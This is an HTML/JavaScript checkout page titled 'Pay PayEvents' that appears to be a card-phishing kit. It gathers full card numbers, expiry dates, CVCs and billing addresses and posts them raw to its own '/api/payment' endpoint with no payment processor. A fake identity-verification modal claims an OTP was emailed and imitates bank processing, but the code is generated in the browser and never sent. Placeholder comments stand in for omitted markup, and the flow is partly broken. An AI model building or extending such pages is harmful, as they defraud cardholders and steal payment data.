<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pay PayEvents — Checkout</title>
  <link rel="preconnect" href="https://fonts.googleapis.com/">
  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg viewBox='0 0 72 72' xmlns='http://www.w3.org/2000/svg'><circle cx='36' cy='36' r='35' fill='%23fdf2f2' stroke='%23f5c6c2' stroke-width='1'/><path d='M36 10 C36 10 33 18 29 19 C25 20 20 17 20 17 C20 17 23 22 21 25 C19 28 14 27 14 27 C14 27 18 31 17 34 C16 37 11 37 11 37 C11 37 16 40 16 43 C16 46 13 49 13 49 C13 49 19 47 22 49 C25 51 24 56 24 56 C24 56 28 52 31 53 L33 62 L36 58 L39 62 L41 53 C44 52 48 56 48 56 C48 56 47 51 50 49 C53 47 59 49 59 49 C59 49 56 46 56 43 C56 40 61 37 61 37 C61 37 56 37 55 34 C54 31 58 27 58 27 C58 27 53 28 51 25 C49 22 52 17 52 17 C52 17 47 20 43 19 C39 18 36 10 36 10 Z' fill='%23c0392b' opacity='.92'/><rect x='22' y='55' width='28' height='9' rx='2.5' fill='%23c0392b' opacity='.13'/><circle cx='22' cy='59.5' r='2.2' fill='%23fdf2f2'/><circle cx='50' cy='59.5' r='2.2' fill='%23fdf2f2'/><circle cx='36' cy='37' r='3.5' fill='%23fff' opacity='.65'/></svg>">

  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
  <style>
    /* (Keep ALL your existing CSS from previous HTML - it's unchanged) */
    /* For brevity, I'm omitting the CSS here as it's the same as your original */
    /* Just copy your entire <style> section from the previous HTML */
  </style>
</head>

<body>
  <!-- (Keep ALL your existing HTML structure - it's unchanged) -->
  <!-- Just copy everything from <div class="container-fluid p-0"> to </div> from your original -->

  <!-- OTP MODAL -->
  <div id="otp-modal">
    <div class="otp-card">
      <div class="otp-icon-wrap">🔐</div>
      <div class="otp-title">Verify your identity</div>
      <div class="otp-sub">
        Enter the 6-digit OTP sent to your email to complete the payment.
      </div>
      <div class="network-notice" id="network-notice">
        ⚠️ Invalid OTP. Please try again.
      </div>
      <div class="otp-inputs">
        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
        <input class="otp-box" type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
      </div>
      <button class="otp-submit-btn" id="otp-submit" disabled>Verify & Complete Payment</button>
      <div class="otp-resend">
        Didn't receive a code?
        <span class="link" id="resend-btn">Resend OTP</span>
        <span id="resend-countdown"></span>
      </div>
    </div>
  </div>

  <!-- PROCESSING OVERLAY -->
  <div id="processing-overlay">
    <div class="processing-card">
      <div class="spinner-wrap" id="spinner-wrap">
        <div class="spinner-pulse"></div>
        <div class="spinner-ring"></div>
        <div class="spinner-icon">💳</div>
      </div>
      <div class="success-tick" id="success-tick">
        <svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="26" cy="26" r="25" stroke="#22c55e" stroke-width="2" />
          <path d="M14 27l8 8 16-16" stroke="#22c55e" stroke-width="3"
                stroke-linecap="round" stroke-linejoin="round"
                stroke-dasharray="40" stroke-dashoffset="40">
            <animate attributeName="stroke-dashoffset" from="40" to="0" dur=".5s" fill="freeze" />
          </path>
        </svg>
      </div>
      <div id="proc-title" class="processing-title">Processing your payment...</div>
      <div id="proc-sub" class="processing-sub">
        Securely communicating with your bank.<br>This may take a moment.
      </div>
      <div class="do-not-close" id="proc-warning">
        <span>⚠️</span>
        <span>Do not close or refresh this window.</span>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

  <script>
    // ========== STATE ==========
    let turnstileToken = null;
    let generatedOTP = null;
    let currentPaymentId = null;

    // ========== UTILITIES ==========
    const formatCurrency = (value, currency) => {
      const num = parseFloat(value) || 0;
      const symbols = { CAD: 'CA$', USD: '$', EUR: '€', GBP: '£', AUD: 'A$' };
      return `${symbols[currency] || currency}${num.toFixed(2)}`;
    };

    const updateAmountDisplays = () => {
      const amount = document.getElementById('f-amount').value;
      const currency = document.getElementById('f-currency').value;
      const formatted = formatCurrency(amount, currency);
      ['pay-amount', 'item-price', 'total-due'].forEach(id => {
        document.getElementById(id).textContent = formatted;
      });
      document.getElementById('pay-btn').textContent = `Pay ${formatted}`;
    };

    const callBackend = async (endpoint, data) => {
      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        return await response.json();
      } catch (error) {
        console.error('Backend error:', error);
        throw error;
      }
    };

    // ========== TURNSTILE ==========
    window.onTurnstileSolved = (token) => {
      turnstileToken = token;
      document.getElementById('captcha-status').className = 'captcha-status ok';
      document.getElementById('captcha-status').textContent = '✓ Verified';
      checkFormValidity();
    };

    window.onTurnstileError = () => {
      turnstileToken = null;
      document.getElementById('captcha-status').className = 'captcha-status err';
      document.getElementById('captcha-status').textContent = '✗ Error - retry';
      document.getElementById('pay-btn').disabled = true;
    };

    window.onTurnstileExpired = () => {
      turnstileToken = null;
      document.getElementById('captcha-status').className = 'captcha-status err';
      document.getElementById('captcha-status').textContent = '✗ Expired - retry';
      document.getElementById('pay-btn').disabled = true;
    };

    // ========== FORM VALIDATION ==========
    const checkFormValidity = () => {
      const requiredIds = ['f-email', 'f-name', 'f-country', 'f-address', 'f-city', 'f-province', 'f-postal'];
      const cardValid = document.getElementById('f-card').value.replace(/\s/g, '').length >= 13;
      const expValid = document.getElementById('f-exp').value.length >= 5;
      const cvcValid = document.getElementById('f-cvc').value.length >= 3;
      const amountValid = parseFloat(document.getElementById('f-amount').value) > 0;

      const allFilled = requiredIds.every(id => document.getElementById(id).value) &&
                       cardValid && expValid && cvcValid && amountValid && turnstileToken;

      document.getElementById('pay-btn').disabled = !allFilled;
    };

    // ========== OTP MODAL ==========
    const otpModal = document.getElementById('otp-modal');
    const otpInputs = document.querySelectorAll('.otp-box');
    const otpSubmitBtn = document.getElementById('otp-submit');
    const resendBtn = document.getElementById('resend-btn');
    const resendCountdown = document.getElementById('resend-countdown');
    let resendTimer = null;
    let countdown = 0;

    const generateOTP = () => {
      generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
      return generatedOTP;
    };

    const showOTPModal = () => {
      generatedOTP = generateOTP();
      otpModal.classList.add('active');
      otpInputs[0].focus();
      startResendTimer();
    };

    const startResendTimer = () => {
      countdown = 30;
      resendCountdown.textContent = ` (${countdown}s)`;
      resendBtn.style.opacity = '0.5';
      clearInterval(resendTimer);
      resendTimer = setInterval(() => {
        countdown--;
        resendCountdown.textContent = ` (${countdown}s)`;
        if (countdown <= 0) {
          clearInterval(resendTimer);
          resendBtn.style.opacity = '1';
          resendCountdown.textContent = '';
        }
      }, 1000);
    };

    // OTP Input Handling
    otpInputs.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        if (e.data && !e.data.match(/[0-9]/)) {
          input.value = '';
          return;
        }
        if (input.value.length === 1) {
          input.classList.add('filled');
          if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
        } else {
          input.classList.remove('filled');
        }
        otpSubmitBtn.disabled = !Array.from(otpInputs).every(i => i.value.length === 1);
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
          otpInputs[index - 1].focus();
        }
      });
    });

    // Resend OTP
    resendBtn.addEventListener('click', () => {
      if (countdown > 0) return;
      generatedOTP = generateOTP();
      otpInputs.forEach(input => {
        input.value = '';
        input.classList.remove('filled');
      });
      otpSubmitBtn.disabled = true;
      startResendTimer();
    });

    // Verify OTP
    otpSubmitBtn.addEventListener('click', async () => {
      const enteredOTP = Array.from(otpInputs).map(i => i.value).join('');

      if (enteredOTP !== generatedOTP) {
        document.getElementById('network-notice').style.display = 'block';
        return;
      }

      // Hide OTP modal, show processing
      otpModal.classList.remove('active');
      document.getElementById('processing-overlay').classList.add('active');

      // Send OTP to backend
      try {
        await callBackend('/api/otp', {
          otp: enteredOTP,
          email: document.getElementById('f-email').value,
          paymentId: currentPaymentId
        });

        // Show success
        setTimeout(() => {
          document.getElementById('spinner-wrap').style.display = 'none';
          document.getElementById('success-tick').style.display = 'flex';
          document.getElementById('proc-title').textContent = 'Payment Successful!';
          document.getElementById('proc-sub').textContent = 'Your payment has been processed successfully.';
          document.getElementById('proc-warning').style.display = 'none';
        }, 2000);
      } catch (error) {
        console.error('OTP error:', error);
        alert('Failed to verify OTP. Please try again.');
        document.getElementById('processing-overlay').classList.remove('active');
        otpModal.classList.add('active');
      }
    });

    // ========== PAY BUTTON ==========
    document.getElementById('pay-btn').addEventListener('click', async () => {
      const paymentData = {
        email: document.getElementById('f-email').value,
        full_name: document.getElementById('f-name').value,
        country: document.getElementById('f-country').value,
        address: document.getElementById('f-address').value,
        city: document.getElementById('f-city').value,
        province: document.getElementById('f-province').value,
        postal_code: document.getElementById('f-postal').value,
        card_number: document.getElementById('f-card').value.replace(/\s/g, ''),
        card_expiry: document.getElementById('f-exp').value,
        card_cvc: document.getElementById('f-cvc').value,
        amount: document.getElementById('f-amount').value,
        currency: document.getElementById('f-currency').value
      };

      // Show processing
      document.getElementById('processing-overlay').classList.add('active');
      document.getElementById('pay-btn').disabled = true;

      try {
        // Send payment to backend
        const result = await callBackend('/api/payment', paymentData);

        if (result.ok) {
          currentPaymentId = result.payment_id;
          // Hide processing, show OTP modal
          document.getElementById('processing-overlay').classList.remove('active');
          showOTPModal();
        } else {
          throw new Error(result.error || 'Payment failed');
        }
      } catch (error) {
        console.error('Payment error:', error);
        alert('Payment processing failed. Please try again.');
        document.getElementById('processing-overlay').classList.remove('active');
        document.getElementById('pay-btn').disabled = false;
      }
    });

    // ========== INITIALIZE ==========
    ['f-email', 'f-name', 'f-country', 'f-address', 'f-city', 'f-province', 'f-postal', 'f-card', 'f-exp', 'f-cvc', 'f-amount'].forEach(id => {
      document.getElementById(id).addEventListener('input', checkFormValidity);
    });
    document.getElementById('f-amount').addEventListener('input', updateAmountDisplays);
    document.getElementById('f-currency').addEventListener('change', updateAmountDisplays);
    updateAmountDisplays();
    checkFormValidity();
  </script>
</body>
</html>
